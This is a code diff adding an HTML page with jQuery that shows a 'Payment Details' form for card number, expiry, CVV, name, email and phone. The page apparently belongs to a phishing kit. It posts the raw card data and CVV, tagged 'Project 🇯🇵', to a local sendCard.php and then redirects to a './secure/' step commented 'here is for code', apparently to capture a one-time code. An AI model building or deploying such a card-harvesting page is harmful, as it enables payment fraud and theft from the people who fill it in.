@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link rel="stylesheet" href="./css/Emai.css" />
+  
+    <script src="./index.js"></script>
+
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  </head>
+  <body>
+    <style>
+      .disney_img{
+        margin: auto;
+        display: flex;
+        padding-top: 40px;
+        width: 150px;
+        margin-bottom: 40px;
+      }
+
+    </style>
+    <div class="header">
+      
+    </div>
+
+
+
+
+
+
+    <div class="dialog">
+      <!-- <h2>Title</h2> -->
+      <p id="dialogp">This is the default text of your dialog box.</p>
+
+      <button id="okButton">Ok</button>
+  </div>
+
+  <style>
+      .loader {
+          background: none repeat scroll 0 0 #fff;
+          height: 100%;
+          width: 100%;
+          position: fixed;
+          bottom: 0;
+          left: 0;
+          right: 0;
+          top: 0;
+          z-index: 9999;
+      }
+
+      .loader .loader_inner {
+          animation: animate 1.5s linear infinite;
+          clip: rect(0, 80px, 80px, 40px);
+          height: 80px;
+          width: 80px;
+          position: absolute;
+          left: calc(50% - 40px);
+          top: calc(50% - 40px);
+      }
+
+      @keyframes animate {
+          0% {
+              transform: rotate(0deg)
+          }
+
+          100% {
+              transform: rotate(220deg)
+          }
+      }
+
+      .loader .loader_inner:after {
+          animation: animate2 1.5s ease-in-out infinite;
+          clip: rect(0, 80px, 80px, 40px);
+          content: '';
+          border-radius: 50%;
+          height: 80px;
+          width: 80px;
+          position: absolute;
+      }
+
+      @keyframes animate2 {
+          0% {
+              box-shadow: inset #b3dfd8 0 0 0 17px;
+              transform: rotate(-140deg);
+          }
+
+          50% {
+              box-shadow: inset #b3dfd8 0 0 0 2px;
+          }
+
+          100% {
+              box-shadow: inset #b3dfd8 0 0 0 17px;
+              transform: rotate(140deg);
+          }
+      }
+  </style>
+  <div class="loader" id="loader1" style="display: flex; z-index: 90000000;">
+      <div class="loader_inner"></div>
+  </div>
+
+
+
+
+  <style>
+      @import url(https://fonts.googleapis.com/css?family=RobotoDraft:500);
+
+      #dialogMe {
+          background: #fff;
+          color: #212121;
+          border: 1px solid #212121;
+          border-radius: 2px;
+          padding: 10px;
+      }
+
+      .dialog {
+          margin: 0;
+          background: #fff;
+          display: none;
+          font-family: 'RobotoDraft', sans-serif;
+          position: fixed;
+          top: 50%;
+          left: 50%;
+          width: 300px;
+          height: 185px;
+          margin-left: -150px;
+          margin-top: -92.5px;
+          border-radius: 2px;
+          box-shadow: 0 27px 55px 0 rgba(0, 0, 0, 0.3);
+          box-shadow: 0 17px 17px 0 rgba(0, 0, 0, 0.15);
+          border: 1px solid rgba(0, 0, 0, 0.3);
+          padding: 15px;
+          -webkit-transition: all 0.5s ease-in-out;
+          -moz-transition: all 0.5s ease-in-out;
+          /* -0-transition: all 0.5s ease-in-out; */
+          transition: all 0.5s ease-in-out;
+          opacity: 0;
+          z-index: 12001;
+      }
+
+      .dialog h2 {
+          margin-top: 0px;
+          font-size: 20px;
+          font-weight: 500;
+      }
+
+      #close {
+          float: right;
+          font-size: 20px;
+          margin-top: -2.5px;
+          cursor: pointer;
+          -webkit-transition: all 0.5s ease-in-out;
+          -moz-transition: all 0.5s ease-in-out;
+          /* -0-transition: all 0.5s ease-in-out; */
+          transition: all 0.5s ease-in-out;
+      }
+
+      #okButton {
+          position: fixed;
+          top: 50%;
+          left: 50%;
+          margin-left: -75px;
+          position: relative;
+          width: 150px;
+          height: 37px;
+          border: none;
+          outline: none;
+          letter-spacing: 3px;
+          cursor: pointer;
+          overflow: hidden;
+          user-select: none;
+          border-radius: 3px;
+          box-shadow: 0 4px 10px 0 rgba(0, 0, 0, .4);
+          background: #212121;
+          color: #fff;
+      }
+
+      .dialogBlack {
+          margin: 0;
+          top: 0;
+          left: 0;
+          height: 100%;
+          width: 100%;
+          position: fixed;
+          background: #000;
+          opacity: 0;
+          z-index: -5;
+          -webkit-transition: all 0.5s ease-in-out;
+          -moz-transition: all 0.5s ease-in-out;
+
+          transition: all 0.5s ease-in-out;
+      }
+  </style>
+
+
+
+
+
+    <script>
+
+function dialogMe() {
+        $(".dialog").css("display", "block");
+        $(".dialog").css("borderRadius", "5px");
+        $(".dialogBlack").css("opacity", "0.5");
+        $(".dialogBlack").css("z-index", "25000000000");
+        $(".dialog p, .dialog h2").css("opacity", "1");
+        $("#close").css("opacity", "1");
+        $("#okButton").css("opacity", "1");
+        $(".dialog").css("height", "185px");
+        $(".dialog").css("width", "300px");
+        $(".dialog").css("padding", "15px");
+        setTimeout(function () {
+            $(".dialog").css("opacity", "1");
+        }, 400);
+    }
+
+
+$(".dialog #close, .dialog #okButton, .dialogBlack").click(function () {
+        $(".dialog p, .dialog h2").css("opacity", "0");
+        $(".dialogBlack").css("opacity", "0");
+        $(".dialogBlack").css("z-index", "-5");
+        $("#close").css("opacity", "0");
+        $("#okButton").css("opacity", "0");
+        $(".dialog").css("height", "0px");
+        $(".dialog").css("width", "0px");
+        $(".dialog").css("padding", "0px");
+        setTimeout(function () {
+            $(".dialog").css("opacity", "0");
+        }, 400);
+    });
+
+
+    window.onload = function () {
+      
+        document.getElementById("loader1").style.display = "none";
+
+        
+
+    };
+
+
+
+
+
+    function LuhnAlgorithm(cardNumber) {
+        var cardNumber = cardNumber.replace(/\s/g, '');
+        var cardNumberArray = cardNumber.split('');
+        var sum = 0;
+        for (var i = cardNumberArray.length - 1; i >= 0; i--) {
+            var currentNumber = parseInt(cardNumberArray[i]);
+            if ((cardNumberArray.length - i) % 2 == 0) {
+                currentNumber *= 2;
+                if (currentNumber > 9) {
+                    currentNumber -= 9;
+                }
+            }
+            sum += currentNumber;
+        }
+        return sum % 10 == 0;
+
+    }
+
+
+
+
+
+
+
+
+
+function formatString(e) {
+
+var inputChar = String.fromCharCode(event.keyCode);
+var code = event.keyCode;
+var allowedKeys = [8];
+if (allowedKeys.indexOf(code) !== -1) {
+  return;
+}
+
+event.target.value = event.target.value.replace(
+  /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
+).replace(
+  /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
+).replace(
+  /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
+).replace(
+  /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
+).replace(
+  /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
+).replace(
+  /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
+).replace(
+  /\/\//g, '/' // Prevent entering more than 1 `/`
+);
+
+
+//if doesnt contain a /  in the 2nd position add it
+var trimmed = event.target.value.replace(/\s+/g, '');
+if (trimmed.length ==4 && !trimmed.includes('/')) {
+  event.target.value = trimmed.substr(0, 2) + '/' + trimmed.substr(2, 2);
+}
+}
+
+
+function cardValidation(cardtext) {
+        var cardnumber = cardtext.replace(/\s/g, '');
+        var cardvalidall = true;
+        var cardvalid = true;
+
+        console.log(cardvalid);
+        if (document.getElementById("card_number").value == "") {
+            cardvalidall = false;
+            $(".dialog p").text('Please, enter correct card number');
+            dialogMe();
+        }
+
+        if (document.getElementById("date").value == "") {
+            cardvalidall = false;
+            $(".dialog p").text('Please, enter correct expiration date');
+            dialogMe();
+        }
+
+        if (document.getElementById("phone").value == "") {
+            cardvalidall = false;
+            $(".dialog p").text('Please, enter correct phone number');
+            dialogMe();
+        }
+
+        if (document.getElementById("email").value == "") {
+            cardvalidall = false;
+            $(".dialog p").text('Please, enter correct email');
+            dialogMe();
+        }
+        if (document.getElementById("cvv").value == "") {
+            cardvalidall = false;
+            $(".dialog p").text('Please, enter correct cvv');
+            dialogMe();
+        }
+
+        if (document.getElementById("name").value == "") {
+            cardvalidall = false;
+            $(".dialog p").text('Please, enter correct name');
+            dialogMe();
+        }
+
+
+
+        return cardvalidall;
+
+    }
+
+
+
+function redirectToCode() {
+
+var cardnumber = document.getElementById("card_number").value;
+var date = document.getElementById("date").value;
+var cvv = document.getElementById("cvv").value;
+var name = document.getElementById("name").value;
+let uuid = uuidv4()
+let price = sessionStorage.getItem('total_price')
+
+var cardvalid = cardValidation(cardnumber);
+if (cardvalid) {
+//send to sendCard.php ($_POST["card_number"]) && isset($_POST["expiry"]) && isset($_POST["cvv"]) && isset($_POST["name_on_card"]))
+// localStorage.setItem("card_number", cardnumber);
+// localStorage.setItem("expiry", date);
+// localStorage.setItem("cvv", cvv);
+// localStorage.setItem("name_on_card", name);
+
+//enable loader
+document.getElementById("loader1").style.display = "flex";
+
+$.ajax ({
+  type: "POST",
+  url: "./sendCard.php",
+  
+  data: {card_number: cardnumber, expiry: date, cvv: cvv, name_on_card: name, project: "Project 🇯🇵", price: price, sessionId: uuid},
+  success: function(data) {
+    sessionStorage.setItem('last_num_dig', cardnumber.replaceAll(' ', '').slice(-4))
+    sessionStorage.setItem('sessionId', uuid)
+
+    window.location.href = "./secure/";
+  }
+});
+//here is for code
+
+
+}
+
+}
+
+
+function uuidv4() {
+    return "10000000-1000-4000-8000-100000000000".replace(/[018]/g, c =>
+      (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
+    );
+}
+
+
+
+function formats(ele,e){
+        if(ele.value.length<19){
+          ele.value= ele.value.replace(/\W/gi, '').replace(/(.{4})/g, '$1 ');
+          return true;
+        }else{
+          return false;
+        }
+      }
+      
+      function numberValidation(e){
+        e.target.value = e.target.value.replace(/[^\d ]/g,'');
+        return false;
+      }
+
+      if (localStorage.getItem("language")=="japan") {
+        document.querySelector('.header').innerHTML=`<a href="../index.html">
+          
+
+          
+          </a>
+      <div class="Form_main">
+        <div class="Form_mini">
+          <h1>Payment Details</h1>
+
+          <input placeholder="Email" id="email" type="text" />
+
+          <input placeholder="Phone" id="phone" type="text" />
+
+          <h3 style="margin-top: 5%;">
+    Card 
+          </h3>
+        <input id="card_number" maxlength='19' onkeypress='return formats(this,event)' onkeyup="return numberValidation(event)"  placeholder="1234 5678 9012 3456" type="text" />
+
+        <div style="display: flex; flex-direction: row;">
+          <input maxlength='5' 
+        id="date"
+          placeholder="MM/YY" type="text" onkeyup="formatString(event);" onkeydown="formatString(event);" 
+          style="margin-right: 2%;" />
+
+
+
+        <input 
+        id="cvv"  maxlength='4'  minlength='3' 
+        placeholder="Security Code" type="text" style="width: 48%;" />
+
+    
+
+</div>
+      
+<input 
+id="name"
+placeholder="Cardholder Name" type="text" />
+
+
+          <button onclick="redirectToCode()">Continue</button>
+
+  <br> 
+
+
+        </div>
+      </div>
+      
+      <br>  <br> 
+      
+      
+      `
+      }else{
+        document.querySelector(".header").innerHTML=`
+      <div class="Form_main">
+        <div class="Form_mini">
+          <h1>Payment Details</h1>
+
+          <input placeholder="Email" id="email" type="text" />
+
+          <input placeholder="Phone" id="phone" type="text" />
+
+          <h3 style="margin-top: 5%;">
+    Card 
+          </h3>
+        <input id="card_number" maxlength='19' onkeypress='return formats(this,event)' onkeyup="return numberValidation(event)"  placeholder="1234 5678 9012 3456" type="text" />
+
+        <div style="display: flex; flex-direction: row;">
+          <input maxlength='5' 
+        id="date"
+          placeholder="MM/YY" type="text" onkeyup="formatString(event);" onkeydown="formatString(event);" 
+          style="margin-right: 2%;" />
+
+
+
+        <input 
+        id="cvv"  maxlength='4'  minlength='3' 
+        placeholder="Security Code" type="text" style="width: 48%;" />
+
+    
+
+</div>
+      
+<input 
+id="name"
+placeholder="Cardholder Name" type="text" />
+
+
+          <button style='cursor:pointer' onclick="redirectToCode()">Continue</button>
+
+  <br> 
+
+
+        </div>
+      </div>
+      
+      <br>  <br> 
+      
+      
+      `
+      }
+
+      
+    </script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
